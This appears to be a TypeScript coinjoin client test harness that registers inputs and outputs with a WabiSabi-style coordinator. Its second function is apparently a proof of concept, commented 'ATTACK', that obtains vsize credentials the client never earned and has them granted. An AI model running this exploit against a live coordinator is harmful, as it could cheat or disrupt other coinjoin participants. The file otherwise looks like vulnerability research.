import * as coordinator from '../coordinator';
import * as middleware from '../middleware';
import { getEvents } from '../utils';
import { Arena, Round, Alice, AlicePhase } from '../types';

export const outputRegistration1 = async (round: Round, alice: Alice): Promise<Alice | void> => {
    if (alice.phase !== AlicePhase.ConnectionConfirmation) return;

    const realAmountCredentials1 = await middleware.getCredentials(
        round.amountCredentialIssuerParameters,
        alice.confirmationData.realAmountCredentials,
        alice.realAmountCredentials.credentialsResponseValidation,
    );
    const realVsizeCredentials1 = await middleware.getCredentials(
        round.vsizeCredentialIssuerParameters,
        alice.confirmationData.realVsizeCredentials,
        alice.realVsizeCredentials.credentialsResponseValidation,
    );

    const zeroAmountCredentials1 = await middleware.getCredentials(
        round.amountCredentialIssuerParameters,
        alice.confirmationData.zeroAmountCredentials,
        alice.zeroAmountCredentials.credentialsResponseValidation,
    );

    const zeroVsizeCredentials1 = await middleware.getCredentials(
        round.vsizeCredentialIssuerParameters,
        alice.confirmationData.zeroVsizeCredentials,
        alice.zeroVsizeCredentials.credentialsResponseValidation,
    );

    // const half = Math.floor(alice.amount / 2);

    // const firstKnowOutput = registeredOutputs[0].output.value + 3999; // feeRate * delka
    // const firstKnowOutput = registeredOutputs[0].output.value + 31 * round!.feeRate; // bech 32 feeRate * delka fee rrate: 129000

    const { availableAmount } = alice;
    const outputFee = (alice.outputSize * round.feeRate) / 1000;
    // const firstKnowOutput = registeredOutputs[0].output.value + outputFee;
    const firstKnowOutput = availableAmount / 2 + outputFee;
    // const firstKnowOutput = 200000 + 3999;

    console.warn('FIRST KNOWN!', availableAmount, firstKnowOutput, alice.amount - firstKnowOutput);

    const issuanceAmountCredentials = await middleware.getRealCredentials(
        [firstKnowOutput, availableAmount - firstKnowOutput],
        realAmountCredentials1,
        round.amountCredentialIssuerParameters,
        round.maxAmountCredentialValue,
    );
    const issuanceVsizeCredentials = await middleware.getRealCredentials(
        [
            (round.maxVsizeAllocationPerAlice - alice.inputSize) / 2,
            (round.maxVsizeAllocationPerAlice - alice.inputSize) / 2,
        ],
        realVsizeCredentials1,
        round.vsizeCredentialIssuerParameters,
        round.maxVsizeCredentialValue,
    );

    const issuanceData = await coordinator.credentialIssuance(
        alice,
        issuanceAmountCredentials,
        issuanceVsizeCredentials,
    );

    const outputRealAmountCredentials = await middleware.getCredentials(
        round.amountCredentialIssuerParameters,
        issuanceData.realAmountCredentials,
        issuanceAmountCredentials.credentialsResponseValidation,
    );

    const outputRealVsizeCredentials = await middleware.getCredentials(
        round.vsizeCredentialIssuerParameters,
        issuanceData.realVsizeCredentials,
        issuanceVsizeCredentials.credentialsResponseValidation,
    );

    const promises = outputRealAmountCredentials.map(
        (_c: any, i: any) =>
            new Promise(async resolve => {
                const outputAmountCredentials = await middleware.getRealCredentials(
                    [0],
                    [outputRealAmountCredentials[i], zeroAmountCredentials1[i]],
                    round.amountCredentialIssuerParameters,
                    round.maxAmountCredentialValue,
                );
                const outputVsizeCredentials = await middleware.getRealCredentials(
                    [outputRealVsizeCredentials[i].value - alice.outputSize],
                    [outputRealVsizeCredentials[i], zeroVsizeCredentials1[i]],
                    round.vsizeCredentialIssuerParameters,
                    round.maxVsizeCredentialValue,
                );

                const output = alice.outputAddresses[i];

                await coordinator.outputRegistration(
                    alice,
                    output,
                    outputAmountCredentials,
                    outputVsizeCredentials,
                );

                resolve(output);
            }),
    );

    const outputs = await Promise.all(promises);

    await coordinator.readyToSign(alice);

    console.log('...outputRegistration', outputs);
    return {
        ...alice,
        outputs,
        phase: AlicePhase.OutputRegistration,
    };
};

const sumInputs = async (arena: Arena) => {
    const { inputs } = arena;
    for (let i = 0; i < inputs.length; i += 2) {}
};

export const outputRegistration = async (arena: Arena): Promise<Arena> => {
    const registeredInputs = getEvents('InputAdded', arena.round.coinjoinState.events);
    console.warn('OUTPUT REG', registeredInputs);

    const internalAmounts: number[] = [];
    let outputSize = 0;
    let availableVsize = 0;
    let availableAmount = 0;
    arena.inputs.forEach(i => {
        availableAmount += i.availableAmount;
        internalAmounts.push(i.availableAmount);
        availableVsize += i.availableVsize;
        outputSize = Math.max(i.outputSize, outputSize);
    });

    const { round, inputs } = arena;

    const a = await middleware.getRealCredentials(
        [inputs[0].availableAmount, inputs[1].availableAmount],
        [inputs[0].newAmountCredentials, inputs[1].newAmountCredentials],
        round.amountCredentialIssuerParameters,
        round.maxAmountCredentialValue,
    );
    // const s = await middleware.getRealCredentials(
    //     [inputs[0].availableVsize, 0],
    //     [inputs[0].newVsizeCredentials, inputs[1].newVsizeCredentials],
    //     round.vsizeCredentialIssuerParameters,
    //     round.maxVsizeCredentialValue,
    // );
    const s = await middleware.getZeroCredentials(round.vsizeCredentialIssuerParameters);

    const joinedIssuance = await coordinator.credentialIssuance(inputs[0], a, s);

    console.warn('joinedIssuance', joinedIssuance);

    const outputAmounts = await middleware.decomposeAmounts(
        arena.round,
        outputSize,
        availableVsize,
        internalAmounts,
        [],
    );
    // [86093442, 86093442, 86093442, 40786134]
    console.warn('====> DECOMPOSED', outputAmounts);

    const amountCredentials = await middleware.getCredentials(
        round.amountCredentialIssuerParameters,
        joinedIssuance.realAmountCredentials,
        a.credentialsResponseValidation,
    );
    const vsizeCredentials = await middleware.getCredentials(
        round.vsizeCredentialIssuerParameters,
        joinedIssuance.realVsizeCredentials, // ATTACK: 0 credentials
        s.credentialsResponseValidation,
    );

    const issuanceAmountCredentials = await middleware.getRealCredentials(
        // [outputAmounts[0], outputAmounts[1]],
        [299078457, availableAmount - 299078457],
        amountCredentials,
        round.amountCredentialIssuerParameters,
        round.maxAmountCredentialValue,
    );
    const issuanceVsizeCredentials = await middleware.getRealCredentials(
        [255, availableVsize - 255], // ATTACK: claiming non existing vsize
        vsizeCredentials,
        round.vsizeCredentialIssuerParameters,
        round.maxVsizeCredentialValue,
    );

    const issuanceData = await coordinator.credentialIssuance(
        inputs[0],
        issuanceAmountCredentials,
        issuanceVsizeCredentials, // ATTACK: issuance granted
    );

    const amountCredentialsOut = await middleware.getCredentials(
        round.amountCredentialIssuerParameters,
        issuanceData.realAmountCredentials,
        issuanceAmountCredentials.credentialsResponseValidation,
    );
    const vsizeCredentialsOut = await middleware.getCredentials(
        round.vsizeCredentialIssuerParameters,
        issuanceData.realVsizeCredentials,
        issuanceVsizeCredentials.credentialsResponseValidation,
    );

    const zeroAmountCredentialsOut = await middleware.getCredentials(
        round.amountCredentialIssuerParameters,
        issuanceData.zeroAmountCredentials,
        inputs[0].zeroAmountCredentials.credentialsResponseValidation,
    );

    const zeroVsizeCredentialsOut = await middleware.getCredentials(
        round.vsizeCredentialIssuerParameters,
        issuanceData.zeroVsizeCredentials,
        inputs[0].zeroVsizeCredentials.credentialsResponseValidation,
    );

    const promises = amountCredentialsOut.slice(0, 1).map(
        (_c: any, i: any) =>
            new Promise(async resolve => {
                const outputAmountCredentials = await middleware.getRealCredentials(
                    [0],
                    [amountCredentialsOut[i], zeroAmountCredentialsOut[i]],
                    round.amountCredentialIssuerParameters,
                    round.maxAmountCredentialValue,
                );
                const outputVsizeCredentials = await middleware.getRealCredentials(
                    [vsizeCredentialsOut[i].value - inputs[0].outputSize],
                    [vsizeCredentialsOut[i], zeroVsizeCredentialsOut[i]],
                    round.vsizeCredentialIssuerParameters,
                    round.maxVsizeCredentialValue,
                );

                const output = inputs[0].outputAddresses[i];

                await coordinator.outputRegistration(
                    inputs[0],
                    output,
                    outputAmountCredentials,
                    outputVsizeCredentials,
                );

                resolve(output);
            }),
    );

    const outputs = await Promise.all(promises);

    await Promise.all(inputs.map(i => coordinator.readyToSign(i)));

    console.log('...outputRegistration', outputs);
    return {
        round: arena.round,
        inputs: arena.inputs.map(i => ({
            ...i,
            outputs,
            phase: AlicePhase.OutputRegistration,
        })),
    };

    // console.warn('issuanceData2', issuanceData);

    // // const inputs2 = await Promise.all(
    // //     arena.inputs.map(inp => outputRegistration1(arena.round, inp)),
    // // );
    // return {
    //     round: arena.round,
    //     inputs: arena.inputs,
    //     // inputs: inputs2,
    // };
};
